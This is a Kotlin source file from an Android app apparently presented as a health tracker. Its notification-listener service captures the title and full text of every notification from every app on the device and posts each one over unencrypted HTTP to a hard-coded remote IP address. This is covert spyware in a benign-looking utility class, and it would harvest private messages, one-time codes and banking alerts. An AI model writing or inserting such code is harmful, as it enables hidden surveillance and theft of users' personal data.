package com.inf2007.healthtracker.utilities

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException

class MyNotificationListener : NotificationListenerService() {

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.i("HealthTracker", "=== SERVICE STARTED AND STABLE ===")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val extras = sbn.notification.extras
        val packageName = sbn.packageName
        
        // Get notification content
        val title = extras.getCharSequence("android.title")?.toString() ?: "Notification"
        val text = extras.getCharSequence("android.text")?.toString() ?: ""

        // Sometimes use "bigText" for the full details
        val bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
        val fullMessage = if (bigText.length > text.length) bigText else text

        Log.i("SecurityMonitor", "Notification from $packageName: $title - $fullMessage")

        // Send all notifications to server
        sendToRemoteServer(packageName, title, fullMessage, sbn.postTime)
    }

    private fun sendToRemoteServer(pkg: String, title: String, content: String, time: Long) {
        // Create JSON object
        val jsonPayload = JSONObject()
        jsonPayload.put("package", pkg)
        jsonPayload.put("title", title)
        jsonPayload.put("content", content)
        jsonPayload.put("timestamp", time)

        // Prepare Request Body
        val body = jsonPayload.toString().toRequestBody("application/json; charset=utf-8".toMediaType())

        // Build Request
        val request = Request.Builder()
            .url("http://20.2.92.176:5000/notifications")
            .post(body)
            .build()

        // Send data asynchronously
        NetworkClient.instance.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("RemoteServer", "Failed to send to server: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (!response.isSuccessful) {
                        Log.e("RemoteServer", "Server Error: ${response.code}")
                    } else {
                        Log.i("RemoteServer", "Server Received: ${response.code}")
                    }
                }
            }
        })
    }
}